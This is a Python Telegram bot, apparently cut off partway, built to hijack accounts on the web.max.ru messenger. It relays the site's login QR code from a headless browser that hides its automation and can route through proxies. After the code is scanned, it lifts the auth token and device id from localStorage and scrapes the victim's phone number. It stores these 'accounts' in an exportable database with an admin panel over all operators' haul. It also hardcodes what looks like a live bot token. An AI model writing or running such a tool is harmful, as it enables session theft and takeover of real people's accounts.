import asyncio
import json
import logging
import os
import re
import shutil
import zipfile
from datetime import date, datetime
from pathlib import Path
from urllib.parse import unquote, urlsplit

from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery, FSInputFile, InlineKeyboardButton, InlineKeyboardMarkup
from playwright.async_api import Page, async_playwright

# ---------- Settings ----------
BOT_TOKEN = "8556283064:AAEWuuabtgwC5lZP-xj27LBNN18YI6yjx6k"
MAIN_ADMIN_ID = 8038099276
TARGET_URL = "https://web.max.ru"
QR_SELECTOR = "div.qr > svg[viewBox='0 0 4059 4059']"
LOGIN_TIMEOUT = 60_000
ADMIN_USERS_PAGE_SIZE = 6

# ---------- Storage ----------
DATA_DIR = os.getenv("DATA_DIR", "/app/data")
BASE_DATA_DIR = Path(DATA_DIR)
BASE_DATA_DIR.mkdir(parents=True, exist_ok=True)

DEFAULT_STATS = {
    "total": 0,
    "today": 0,
    "exports": 0,
    "last_date": str(date.today()),
}

INLINE_BUTTON_FIELDS = set(
    (getattr(InlineKeyboardButton, "model_fields", None) or getattr(InlineKeyboardButton, "__fields__", {})).keys()
)
BUTTON_STYLE_SUPPORTED = "style" in INLINE_BUTTON_FIELDS

user_sessions: dict[int, dict] = {}
user_temp_data: dict[int, dict] = {}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)


# ---------- FSM ----------
class ClearConfirm(StatesGroup):
    first = State()
    second = State()


class SaveFormat(StatesGroup):
    waiting = State()


class ProxyInput(StatesGroup):
    waiting = State()


# ---------- File helpers ----------
def get_user_dir(user_id: int) -> Path:
    user_dir = BASE_DATA_DIR / str(user_id)
    user_dir.mkdir(exist_ok=True)
    return user_dir


def get_accounts_dir(user_id: int) -> Path:
    acc_dir = get_user_dir(user_id) / "accounts"
    acc_dir.mkdir(exist_ok=True)
    return acc_dir


def get_existing_accounts_dir(user_id: int) -> Path:
    return BASE_DATA_DIR / str(user_id) / "accounts"


def get_stats_path(user_id: int) -> Path:
    return get_user_dir(user_id) / "stats.json"


def get_existing_stats_path(user_id: int) -> Path:
    return BASE_DATA_DIR / str(user_id) / "stats.json"


def get_profile_path(user_id: int) -> Path:
    return get_user_dir(user_id) / "profile.json"


def get_existing_profile_path(user_id: int) -> Path:
    return BASE_DATA_DIR / str(user_id) / "profile.json"


def get_proxy_path(user_id: int) -> Path:
    return get_user_dir(user_id) / "proxies.json"


def get_existing_proxy_path(user_id: int) -> Path:
    return BASE_DATA_DIR / str(user_id) / "proxies.json"


def normalize_stats(stats: dict | None) -> dict:
    normalized = DEFAULT_STATS.copy()
    if isinstance(stats, dict):
        normalized.update(stats)
    today = str(date.today())
    if normalized.get("last_date") != today:
        normalized["today"] = 0
    normalized["last_date"] = normalized.get("last_date") or today
    normalized["total"] = int(normalized.get("total", 0))
    normalized["today"] = int(normalized.get("today", 0))
    normalized["exports"] = int(normalized.get("exports", 0))
    return normalized


def load_stats(user_id: int) -> dict:
    path = get_existing_stats_path(user_id)
    if path.exists():
        try:
            with open(path, "r", encoding="utf-8") as file:
                return normalize_stats(json.load(file))
        except (json.JSONDecodeError, OSError):
            logging.warning("Could not read stats for user %s", user_id)
    return normalize_stats(None)


def save_stats(user_id: int, stats: dict):
    with open(get_stats_path(user_id), "w", encoding="utf-8") as file:
        json.dump(normalize_stats(stats), file, ensure_ascii=False, indent=2)


def update_stats_on_login(user_id: int):
    stats = normalize_stats(load_stats(user_id))
    today = str(date.today())
    if stats.get("last_date") != today:
        stats["today"] = 0
    stats["total"] += 1
    stats["today"] += 1
    stats["last_date"] = today
    save_stats(user_id, stats)


def update_stats_on_export(user_id: int):
    stats = normalize_stats(load_stats(user_id))
    stats["exports"] += 1
    save_stats(user_id, stats)


def touch_user_profile(user: types.User):
    path = get_profile_path(user.id)
    existing = {}
    if path.exists():
        try:
            with open(path, "r", encoding="utf-8") as file:
                existing = json.load(file)
        except (json.JSONDecodeError, OSError):
            existing = {}

    payload = {
        "user_id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "full_name": user.full_name,
        "language_code": user.language_code,
        "is_premium": getattr(user, "is_premium", False),
        "first_seen_at": existing.get("first_seen_at") or datetime.now().isoformat(timespec="seconds"),
        "updated_at": datetime.now().isoformat(timespec="seconds"),
    }
    with open(path, "w", encoding="utf-8") as file:
        json.dump(payload, file, ensure_ascii=False, indent=2)


def load_user_profile(user_id: int) -> dict:
    path = get_existing_profile_path(user_id)
    if path.exists():
        try:
            with open(path, "r", encoding="utf-8") as file:
                data = json.load(file)
                if isinstance(data, dict):
                    return data
        except (json.JSONDecodeError, OSError):
            logging.warning("Could not read profile for user %s", user_id)
    return {
        "user_id": user_id,
        "username": None,
        "first_name": None,
        "last_name": None,
        "full_name": f"User {user_id}",
        "language_code": None,
        "is_premium": False,
        "first_seen_at": None,
        "updated_at": None,
    }


def parse_proxy_line(raw_proxy: str) -> dict:
    proxy = raw_proxy.strip()
    if not proxy:
        raise ValueError("Пустая строка")

    if "://" in proxy:
        parsed = urlsplit(proxy)
        if parsed.scheme not in {"http", "https", "socks4", "socks5"}:
            raise ValueError("Поддерживаются только http, https, socks4, socks5")
        if not parsed.hostname or not parsed.port:
            raise ValueError("Не удалось определить host и port")

        username = unquote(parsed.username) if parsed.username else None
        password = unquote(parsed.password) if parsed.password else None
        server = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
        display = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
        if username:
            display = f"{parsed.scheme}://{username}:***@{parsed.hostname}:{parsed.port}"
        return {
            "raw": proxy,
            "server": server,
            "username": username,
            "password": password,
            "display": display,
            "is_valid": None,
            "last_checked_at": None,
            "error": None,
        }

    if "@" in proxy:
        credentials, host_part = proxy.rsplit("@", 1)
        if ":" not in credentials:
            raise ValueError("Формат логина и пароля должен быть user:pass")
        username, password = credentials.split(":", 1)
        if ":" not in host_part:
            raise ValueError("Формат адреса должен быть host:port")
        host, port = host_part.rsplit(":", 1)
        server = f"http://{host}:{port}"
        return {
            "raw": proxy,
            "server": server,
            "username": username,
            "password": password,
            "display": f"http://{username}:***@{host}:{port}",
            "is_valid": None,
            "last_checked_at": None,
            "error": None,
        }

    parts = proxy.split(":")
    if len(parts) == 2:
        host, port = parts
        return {
            "raw": proxy,
            "server": f"http://{host}:{port}",
            "username": None,
            "password": None,
            "display": f"http://{host}:{port}",
            "is_valid": None,
            "last_checked_at": None,
            "error": None,
        }

    if len(parts) == 4:
        host, port, username, password = parts
        return {
            "raw": proxy,
            "server": f"http://{host}:{port}",
            "username": username,
            "password": password,
            "display": f"http://{username}:***@{host}:{port}",
            "is_valid": None,
            "last_checked_at": None,
            "error": None,
        }

    raise ValueError("Используйте host:port, host:port:login:pass или scheme://login:pass@host:port")


def load_user_proxies(user_id: int) -> list[dict]:
    path = get_existing_proxy_path(user_id)
    if not path.exists():
        return []

    try:
        with open(path, "r", encoding="utf-8") as file:
            data = json.load(file)
    except (json.JSONDecodeError, OSError):
        logging.warning("Could not read proxies for user %s", user_id)
        return []

    if not isinstance(data, list):
        return []

    normalized: list[dict] = []
    for item in data:
        if not isinstance(item, dict):
            continue
        try:
            parsed = parse_proxy_line(item.get("raw") or item.get("server") or "")
        except ValueError:
            continue
        parsed["is_valid"] = item.get("is_valid")
        parsed["last_checked_at"] = item.get("last_checked_at")
        parsed["error"] = item.get("error")
        normalized.append(parsed)
    return normalized


def save_user_proxies(user_id: int, proxies: list[dict]):
    with open(get_proxy_path(user_id), "w", encoding="utf-8") as file:
        json.dump(proxies, file, ensure_ascii=False, indent=2)


def clear_user_proxies(user_id: int):
    path = get_existing_proxy_path(user_id)
    if path.exists():
        path.unlink()


def build_playwright_proxy(proxy_entry: dict) -> dict:
    config = {"server": proxy_entry["server"]}
    if proxy_entry.get("username"):
        config["username"] = proxy_entry["username"]
    if proxy_entry.get("password"):
        config["password"] = proxy_entry["password"]
    return config


def get_preferred_proxy(user_id: int) -> dict | None:
    proxies = load_user_proxies(user_id)
    for proxy in proxies:
        if proxy.get("is_valid") is True:
            return proxy
    return proxies[0] if proxies else None


def get_proxy_stats(user_id: int) -> dict:
    proxies = load_user_proxies(user_id)
    valid = sum(1 for proxy in proxies if proxy.get("is_valid") is True)
    invalid = sum(1 for proxy in proxies if proxy.get("is_valid") is False)
    unchecked = sum(1 for proxy in proxies if proxy.get("is_valid") is None)
    return {
        "total": len(proxies),
        "valid": valid,
        "invalid": invalid,
        "unchecked": unchecked,
        "proxies": proxies,
    }


def iter_user_dirs() -> list[Path]:
    if not BASE_DATA_DIR.exists():
        return []
    return sorted(
        [path for path in BASE_DATA_DIR.iterdir() if path.is_dir() and path.name.isdigit()],
        key=lambda path: int(path.name),
    )


def iter_user_ids() -> list[int]:
    return [int(path.name) for path in iter_user_dirs()]


def is_main_admin(user_id: int) -> bool:
    return user_id == MAIN_ADMIN_ID


def format_dt(value: float | str | None) -> str:
    if value is None:
        return "—"
    if isinstance(value, (int, float)):
        return datetime.fromtimestamp(value).strftime("%d.%m.%Y %H:%M")
    try:
        return datetime.fromisoformat(value).strftime("%d.%m.%Y %H:%M")
    except (ValueError, TypeError):
        return str(value)


def format_size(size_bytes: int) -> str:
    units = ["B", "KB", "MB", "GB"]
    size = float(size_bytes)
    unit = units[0]
    for next_unit in units:
        unit = next_unit
        if size < 1024 or unit == units[-1]:
            break
        size /= 1024
    return f"{size:.1f} {unit}" if unit != "B" else f"{int(size)} {unit}"


def get_account_files(user_id: int, today_only: bool = False) -> list[Path]:
    acc_dir = get_existing_accounts_dir(user_id)
    if not acc_dir.exists():
        return []
    files = [path for path in acc_dir.glob("*.*") if path.is_file()]
    if not today_only:
        return sorted(files, key=lambda item: item.stat().st_mtime, reverse=True)

    today = date.today().isoformat()
    filtered = [
        path
        for path in files
        if date.fromtimestamp(path.stat().st_mtime).isoformat() == today
    ]
    return sorted(filtered, key=lambda item: item.stat().st_mtime, reverse=True)


def get_user_snapshot(user_id: int) -> dict:
    user_dir = BASE_DATA_DIR / str(user_id)
    profile = load_user_profile(user_id)
    stats = load_stats(user_id)
    account_files = get_account_files(user_id)
    stats_path = get_existing_stats_path(user_id)
    profile_path = get_existing_profile_path(user_id)
    total_size = sum(path.stat().st_size for path in account_files if path.exists())
    if stats_path.exists():
        total_size += stats_path.stat().st_size
    if profile_path.exists():
        total_size += profile_path.stat().st_size

    last_activity = None
    mtimes = [path.stat().st_mtime for path in account_files if path.exists()]
    if stats_path.exists():
        mtimes.append(stats_path.stat().st_mtime)
    if profile_path.exists():
        mtimes.append(profile_path.stat().st_mtime)
    if mtimes:
        last_activity = max(mtimes)
    elif user_dir.exists():
        last_activity = user_dir.stat().st_mtime

    return {
        "user_id": user_id,
        "profile": profile,
        "stats": stats,
        "account_files": account_files,
        "account_count": len(account_files),
        "total_size": total_size,
        "last_activity": last_activity,
        "created_at": user_dir.stat().st_ctime if user_dir.exists() else None,
    }


def get_global_snapshot() -> dict:
    user_ids = iter_user_ids()
    snapshots = [get_user_snapshot(user_id) for user_id in user_ids]
    return {
        "users": len(snapshots),
        "accounts": sum(item["account_count"] for item in snapshots),
        "exports": sum(item["stats"]["exports"] for item in snapshots),
        "today": sum(item["stats"]["today"] for item in snapshots),
        "size": sum(item["total_size"] for item in snapshots),
        "snapshots": snapshots,
    }


def get_display_name(user_id: int) -> str:
    profile = load_user_profile(user_id)
    if profile.get("username"):
        return f"@{profile['username']}"
    if profile.get("full_name"):
        return profile["full_name"]
    return f"User {user_id}"


# ---------- UI helpers ----------
def make_button(text: str, callback_data: str | None = None, style: str | None = None) -> InlineKeyboardButton:
    kwargs = {"text": text}
    if callback_data is not None:
        kwargs["callback_data"] = callback_data
    if style:
        kwargs["style"] = style
    try:
        return InlineKeyboardButton(**kwargs)
    except Exception:
        kwargs.pop("style", None)
        return InlineKeyboardButton(**kwargs)


def main_menu_kb(user_id: int) -> InlineKeyboardMarkup:
    rows = [
        [make_button("🔐 Войти в аккаунт", "menu_login", "primary")],
        [
            make_button("📊 Моя статистика", "menu_stats", "success"),
            make_button("📦 Выгрузить базу", "menu_export", "primary"),
        ],
        [make_button("🌐 Прокси", "menu_proxy", "primary")],
        [make_button("🗑 Очистить базу", "menu_clear", "danger")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)


def export_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [make_button("📁 Вся база", "export_all", "primary")],
            [make_button("🗓 Только за сегодня", "export_today", "success")],
            [make_button("⬅️ Назад", "menu_root", "primary")],
        ]
    )


def clear_confirm_step_1_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                make_button("✅ Да, продолжить", "clear_confirm_1", "danger"),
                make_button("⬅️ Назад", "menu_root", "primary"),
            ]
        ]
    )


def clear_confirm_step_2_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [make_button("❌ Удалить безвозвратно", "clear_confirm_2", "danger")],
            [make_button("⬅️ Отмена", "menu_root", "primary")],
        ]
    )


def save_format_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [make_button("📄 Сохранить как .txt", "save_format_txt", "primary")],
            [make_button("🧾 Сохранить как .json", "save_format_json", "success")],
            [make_button("⬅️ В меню", "menu_root", "primary")],
        ]
    )


def proxy_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [make_button("➕ Добавить или заменить", "proxy_add", "primary")],
            [make_button("✅ Проверить прокси", "proxy_validate", "success")],
            [make_button("🗑 Очистить прокси", "proxy_clear", "danger")],
            [make_button("⬅️ В меню", "menu_root", "primary")],
        ]
    )


def admin_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [make_button("📈 Общая статистика", "admin_stats", "success")],
            [make_button("👥 Список пользователей", "admin_users_page_0", "primary")],
            [make_button("🗃 Выгрузить всех пользователей", "admin_export_all", "primary")],
            [make_button("⬅️ В главное меню", "menu_root", "primary")],
        ]
    )


def admin_user_card_kb(user_id: int, page: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [make_button("📊 Подробная статистика", f"admin_user_stats_{user_id}_{page}", "success")],
            [make_button("📦 Выгрузить данные", f"admin_user_export_{user_id}_{page}", "primary")],
            [
                make_button("⬅️ К списку", f"admin_users_page_{page}", "primary"),
                make_button("👑 В админку", "admin_root", "primary"),
            ],
        ]
    )


def admin_user_stats_kb(user_id: int, page: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [make_button("📦 Выгрузить данные", f"admin_user_export_{user_id}_{page}", "primary")],
            [
                make_button("⬅️ Карточка", f"admin_user_{user_id}_{page}", "primary"),
                make_button("👥 Пользователи", f"admin_users_page_{page}", "primary"),
            ],
        ]
    )


def admin_users_kb(page: int) -> InlineKeyboardMarkup:
    user_ids = iter_user_ids()
    start = page * ADMIN_USERS_PAGE_SIZE
    end = start + ADMIN_USERS_PAGE_SIZE
    page_ids = user_ids[start:end]
    rows: list[list[InlineKeyboardButton]] = []

    for user_id in page_ids:
        snapshot = get_user_snapshot(user_id)
        display_name = get_display_name(user_id)
        label = f"👤 {display_name} • {user_id} • {snapshot['account_count']} шт."
        rows.append([make_button(label[:64], f"admin_user_{user_id}_{page}", "primary")])

    total_pages = max(1, (len(user_ids) - 1) // ADMIN_USERS_PAGE_SIZE + 1)
    nav_row: list[InlineKeyboardButton] = []
    if page > 0:
        nav_row.append(make_button("⬅️", f"admin_users_page_{page - 1}", "primary"))
    nav_row.append(make_button(f"📄 {page + 1}/{total_pages}", "noop", "success"))
    if end < len(user_ids):
        nav_row.append(make_button("➡️", f"admin_users_page_{page + 1}", "primary"))
    rows.append(nav_row)
    rows.append([make_button("👑 В админку", "admin_root", "primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def get_main_menu_text(user_id: int) -> str:
    admin_line = "\n• <b>Админ доступ:</b> включен" if is_main_admin(user_id) else ""
    return (
        "<b>Бургерная</b>\n"
        "Добро пожаловать, мой повелитель!\n\n"
        "• <b>Вход:</b> QR-код\n"
    )


def get_user_stats_text(user_id: int) -> str:
    snapshot = get_user_snapshot(user_id)
    stats = snapshot["stats"]
    return (
        "<b>Ваша статистика</b>\n\n"
        f"• <b>ID:</b> <code>{user_id}</code>\n"
        f"• <b>Аккаунтов в базе:</b> <code>{snapshot['account_count']}</code>\n"
        f"• <b>Всего сохранений:</b> <code>{stats['total']}</code>\n"
        f"• <b>Сохранено сегодня:</b> <code>{stats['today']}</code>\n"
        f"• <b>Личных выгрузок:</b> <code>{stats['exports']}</code>\n"
        f"• <b>Размер данных:</b> <code>{format_size(snapshot['total_size'])}</code>"
    )


def get_proxy_menu_text(user_id: int) -> str:
    stats = get_proxy_stats(user_id)
    active_proxy = get_preferred_proxy(user_id)
    active_text = active_proxy["display"] if active_proxy else "не выбран"
    checked_at = "—"
    if active_proxy and active_proxy.get("last_checked_at"):
        checked_at = format_dt(active_proxy["last_checked_at"])

    return (
        "<b>Управление прокси</b>\n\n"
        f"• <b>Всего сохранено:</b> <code>{stats['total']}</code>\n"
        f"• <b>Валидных:</b> <code>{stats['valid']}</code>\n"
        f"• <b>Невалидных:</b> <code>{stats['invalid']}</code>\n"
        f"• <b>Без проверки:</b> <code>{stats['unchecked']}</code>\n"
        f"• <b>Активный прокси:</b> <code>{active_text}</code>\n"
        f"• <b>Последняя проверка активного:</b> <code>{checked_at}</code>\n\n"
        "Поддерживаемые форматы:\n"
        "• <code>host:port</code>\n"
        "• <code>host:port:login:pass</code>\n"
        "• <code>http://login:pass@host:port</code>\n"
        "• <code>socks5://host:port</code>"
    )


def get_admin_panel_text() -> str:
    overview = get_global_snapshot()
    return (
        "<b>Админ-панель</b>\n"
        "Главный центр управления ботом.\n\n"
        f"• <b>Пользователей:</b> <code>{overview['users']}</code>\n"
        f"• <b>Аккаунтов:</b> <code>{overview['accounts']}</code>\n"
        f"• <b>Выгрузок:</b> <code>{overview['exports']}</code>\n"
        f"• <b>Сегодня сохранено:</b> <code>{overview['today']}</code>\n"
        f"• <b>Общий размер данных:</b> <code>{format_size(overview['size'])}</code>"
    )


def get_admin_users_text(page: int) -> str:
    user_ids = iter_user_ids()
    if not user_ids:
        return "<b>Список пользователей</b>\n\nПока нет сохраненных пользователей."

    start = page * ADMIN_USERS_PAGE_SIZE
    end = min(start + ADMIN_USERS_PAGE_SIZE, len(user_ids))
    return (
        "<b>Список пользователей</b>\n\n"
        f"Показаны записи <code>{start + 1}</code>–<code>{end}</code> из <code>{len(user_ids)}</code>.\n"
        "Нажмите на пользователя, чтобы открыть его карточку."
    )


def get_admin_user_card_text(user_id: int) -> str:
    snapshot = get_user_snapshot(user_id)
    profile = snapshot["profile"]
    stats = snapshot["stats"]
    username = f"@{profile['username']}" if profile.get("username") else "—"
    return (
        "<b>Карточка пользователя</b>\n\n"
        f"• <b>ID:</b> <code>{user_id}</code>\n"
        f"• <b>Имя:</b> {profile.get('full_name') or '—'}\n"
        f"• <b>Username:</b> {username}\n"
        f"• <b>Язык:</b> {profile.get('language_code') or '—'}\n"
        f"• <b>Аккаунтов:</b> <code>{snapshot['account_count']}</code>\n"
        f"• <b>Всего сохранений:</b> <code>{stats['total']}</code>\n"
        f"• <b>Размер данных:</b> <code>{format_size(snapshot['total_size'])}</code>\n"
        f"• <b>Первое появление:</b> <code>{format_dt(profile.get('first_seen_at') or snapshot['created_at'])}</code>\n"
        f"• <b>Последняя активность:</b> <code>{format_dt(snapshot['last_activity'])}</code>"
    )


def get_admin_user_stats_text(user_id: int) -> str:
    snapshot = get_user_snapshot(user_id)
    profile = snapshot["profile"]
    stats = snapshot["stats"]
    recent_files = snapshot["account_files"][:5]
    files_text = "\n".join(
        f"• <code>{path.name}</code> — {format_dt(path.stat().st_mtime)}"
        for path in recent_files
    ) or "• Нет сохраненных файлов"
    return (
        "<b>Подробная статистика пользователя</b>\n\n"
        f"• <b>ID:</b> <code>{user_id}</code>\n"
        f"• <b>Пользователь:</b> {get_display_name(user_id)}\n"
        f"• <b>Всего сохранений:</b> <code>{stats['total']}</code>\n"
        f"• <b>Сегодня:</b> <code>{stats['today']}</code>\n"
        f"• <b>Личных выгрузок:</b> <code>{stats['exports']}</code>\n"
        f"• <b>Файлов аккаунтов:</b> <code>{snapshot['account_count']}</code>\n"
        f"• <b>Размер:</b> <code>{format_size(snapshot['total_size'])}</code>\n"
        f"• <b>Последнее обновление профиля:</b> <code>{format_dt(profile.get('updated_at'))}</code>\n\n"
        "<b>Последние файлы</b>\n"
        f"{files_text}"
    )


# ---------- Archive helpers ----------
def create_zip_archive(zip_path: Path, sources: list[tuple[Path, str]]) -> bool:
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as archive:
        written = False
        for source, arcname in sources:
            if source.exists() and source.is_file():
                archive.write(source, arcname=arcname)
                written = True
        return written


def create_user_export_archive(user_id: int, today_only: bool = False, include_meta: bool = False) -> Path | None:
    account_files = get_account_files(user_id, today_only=today_only)
    sources = [(path, path.name) for path in account_files]

    if include_meta:
        stats_path = get_existing_stats_path(user_id)
        profile_path = get_existing_profile_path(user_id)
        if stats_path.exists():
            sources.append((stats_path, "stats.json"))
        if profile_path.exists():
            sources.append((profile_path, "profile.json"))

    if not sources:
        return None

    suffix = "today" if today_only else "all"
    zip_path = Path(f"user_{user_id}_{suffix}_{int(datetime.now().timestamp())}.zip")
    if create_zip_archive(zip_path, sources):
        return zip_path
    if zip_path.exists():
        zip_path.unlink()
    return None


def create_full_user_archive(user_id: int) -> Path | None:
    user_dir = BASE_DATA_DIR / str(user_id)
    if not user_dir.exists():
        return None

    sources: list[tuple[Path, str]] = []
    for path in user_dir.rglob("*"):
        if path.is_file():
            sources.append((path, str(path.relative_to(user_dir.parent)).replace("\\", "/")))

    if not sources:
        return None

    zip_path = Path(f"admin_user_{user_id}_{int(datetime.now().timestamp())}.zip")
    if create_zip_archive(zip_path, sources):
        return zip_path
    if zip_path.exists():
        zip_path.unlink()
    return None


def create_all_users_archive() -> Path | None:
    sources: list[tuple[Path, str]] = []
    for user_dir in iter_user_dirs():
        for path in user_dir.rglob("*"):
            if path.is_file():
                sources.append((path, str(path.relative_to(BASE_DATA_DIR)).replace("\\", "/")))

    if not sources:
        return None

    zip_path = Path(f"all_users_{int(datetime.now().timestamp())}.zip")
    if create_zip_archive(zip_path, sources):
        return zip_path
    if zip_path.exists():
        zip_path.unlink()
    return None


async def validate_proxy_entry(proxy_entry: dict) -> tuple[bool, str | None]:
    browser = None
    try:
        async with async_playwright() as playwright:
            browser = await playwright.chromium.launch(
                headless=True,
                proxy=build_playwright_proxy(proxy_entry),
                args=["--disable-blink-features=AutomationControlled", "--disable-dev-shm-usage", "--no-sandbox"],
            )
            context = await browser.new_context(
                ignore_https_errors=True,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ),
            )
            page = await context.new_page()
            response = await page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=15_000)
            await page.wait_for_timeout(1500)
            if response is None or response.ok:
                return True, None
            return False, f"HTTP {response.status}"
    except Exception as exc:
        return False, str(exc)[:160]
    finally:
        if browser:
            await browser.close()


async def validate_user_proxies(user_id: int) -> dict:
    proxies = load_user_proxies(user_id)
    if not proxies:
        return {"total": 0, "valid": 0, "invalid": 0, "items": []}

    results: list[dict] = []
    valid = 0
    invalid = 0

    for proxy in proxies:
        is_valid, error = await validate_proxy_entry(proxy)
        proxy["is_valid"] = is_valid
        proxy["error"] = error
        proxy["last_checked_at"] = datetime.now().isoformat(timespec="seconds")
        results.append(proxy)
        if is_valid:
            valid += 1
        else:
            invalid += 1

    save_user_proxies(user_id, results)
    return {"total": len(results), "valid": valid, "invalid": invalid, "items": results}


# ---------- Session helpers ----------
async def close_user_session(user_id: int):
    session = user_sessions.pop(user_id, None)
    if session:
        try:
            await session["browser"].close()
            logging.info("Session %s closed", user_id)
        except Exception as exc:
            logging.error("Error closing session %s: %s", user_id, exc)


async def extract_account_data(page: Page) -> dict | None:
    try:
        await page.wait_for_selector("div.left-sidebar, div.sidebar", timeout=10_000)
    except Exception:
        pass

    local_storage = await page.evaluate("() => JSON.stringify(localStorage)")
    ls_data = json.loads(local_storage)
    device_id = ls_data.get("__oneme_device_id", "")
    auth_data = ls_data.get("__oneme_auth", "")
    if not auth_data:
        return None

    phone = None
    try:
        settings_selectors = [
            "button[aria-label='Настройки']",
            "button[aria-label='Settings']",
            "div[data-testid='settings-button']",
            ".settings-btn",
            ".icon-settings",
            "button:has-text('Настройки')",
            "button:has-text('Settings')",
            "a:has-text('Настройки')",
            "a:has-text('Settings')",
            "[class*='settings']",
            "[class*='Settings']",
        ]
        clicked = False
        for selector in settings_selectors:
            try:
                await page.click(selector, timeout=3000)
                clicked = True
                break
            except Exception:
                continue

        if not clicked:
            await page.click("div.avatar, div[class*='avatar']")
            await asyncio.sleep(1)
            await page.click("text=Настройки, text=Settings")

        await page.wait_for_selector("div.modal, div.settings-page, div[class*='settings']", timeout=5000)
        await asyncio.sleep(1)

        phone_selectors = [
            "div:has-text('+7')",
            "span:has-text('+7')",
            "div[class*='phone']",
            "span[class*='phone']",
            "[data-testid='phone-number']",
            ".profile-phone",
        ]
        for selector in phone_selectors:
            try:
                element = await page.wait_for_selector(selector, timeout=2000)
                if element:
                    text = await element.text_content()
                    if not text:
                        continue
                    match = re.search(r"(\+7|8)\s*\(?\d{3}\)?\s*\d{3}[-\s]?\d{2}[-\s]?\d{2}", text)
                    phone = match.group(0) if match else text.strip()
                    phone = re.sub(r"[+\s\-\(\)]", "", phone)
                    if phone.startswith("8"):
                        phone = "7" + phone[1:]
                    break
            except Exception:
                continue

        try:
            await page.click("button[aria-label='Закрыть'], .close, .modal-close", timeout=1000)
        except Exception:
            pass
    except Exception as exc:
        logging.warning("Could not extract phone through settings: %s", exc)

    if not phone:
        try:
            auth_json = json.loads(auth_data)
            viewer_id = auth_json.get("viewerId")
            if viewer_id:
                phone = f"id{viewer_id}"
        except Exception:
            phone = "unknown"

    return {"phone": phone or "unknown", "device_id": device_id, "auth_data": auth_data}


async def monitor_login(page: Page, user_id: int, message: types.Message, state: FSMContext):
    try:
        await page.wait_for_selector(QR_SELECTOR, state="detached", timeout=LOGIN_TIMEOUT)
        await message.answer(
            "<b>Вход выполнен</b>\nИзвлекаю данные аккаунта и подготавливаю сохранение...",
            parse_mode="HTML",
        )
        await asyncio.sleep(2)

        data = await extract_account_data(page)
        if not data:
            await message.answer(
                "<b>Не удалось извлечь токен авторизации.</b>",
                parse_mode="HTML",
            )
            return

        user_temp_data[user_id] = data
        await message.answer(
            "<b>Данные получены</b>\n\n"
            f"• <b>Телефон:</b> <code>{data['phone']}</code>\n"
            "Выберите формат сохранения файла.",
            reply_markup=save_format_kb(),
            parse_mode="HTML",
        )
        await state.set_state(SaveFormat.waiting)
    except asyncio.TimeoutError:
        await message.answer(
            "<b>Время ожидания входа истекло.</b>\nПопробуйте запустить авторизацию еще раз.",
            parse_mode="HTML",
        )
    except Exception as exc:
        logging.error("Error in monitor_login: %s", exc)
        await message.answer(
            "<b>Произошла ошибка при обработке входа.</b>",
            parse_mode="HTML",
        )


async def login_process(user_id: int, message: types.Message, state: FSMContext):
    launch_kwargs = {
        "headless": True,
        "args": ["--disable-blink-features=AutomationControlled", "--disable-dev-shm-usage", "--no-sandbox"],
    }
    proxy_entry = get_preferred_proxy(user_id)
    if proxy_entry:
        launch_kwargs["proxy"] = build_playwright_proxy(proxy_entry)

    async with async_playwright() as playwright:
        browser = await playwright.chromium.launch(**launch_kwargs)
        context = await browser.new_context(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            )
        )
        page = await context.new_page()
        user_sessions[user_id] = {"browser": browser, "page": page}

        try:
            await page.goto(TARGET_URL, wait_until="networkidle")
            qr_element = await page.wait_for_selector(QR_SELECTOR, timeout=15_000)
            screenshot_bytes = await qr_element.screenshot()

            temp_file = Path(f"qr_{user_id}.png")
            with open(temp_file, "wb") as file:
                file.write(screenshot_bytes)

            try:
                await message.answer_photo(
                    FSInputFile(temp_file),
                    caption="🔐 Отсканируйте QR-код для входа в аккаунт.",
                )
            finally:
                if temp_file.exists():
                    temp_file.unlink()

            await monitor_login(page, user_id, message, state)
        except asyncio.TimeoutError:
            await message.answer(
                "<b>Не удалось найти QR-код на странице.</b>",
                parse_mode="HTML",
            )
        except Exception as exc:
            logging.error("Error in login_process: %s", exc)
            await message.answer(
                "<b>Ошибка при получении QR-кода.</b>",
                parse_mode="HTML",
            )
        finally:
            await close_user_session(user_id)


# ---------- Common handlers ----------
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    touch_user_profile(message.from_user)
    user_temp_data.pop(message.from_user.id, None)
    await state.clear()
    await message.answer(
        get_main_menu_text(message.from_user.id),
        reply_markup=main_menu_kb(message.from_user.id),
        parse_mode="HTML",
    )


@dp.callback_query(F.data == "menu_root")
async def menu_root(callback: CallbackQuery, state: FSMContext):
    touch_user_profile(callback.from_user)
    user_temp_data.pop(callback.from_user.id, None)
    await state.clear()
    await callback.answer()
    await callback.message.edit_text(
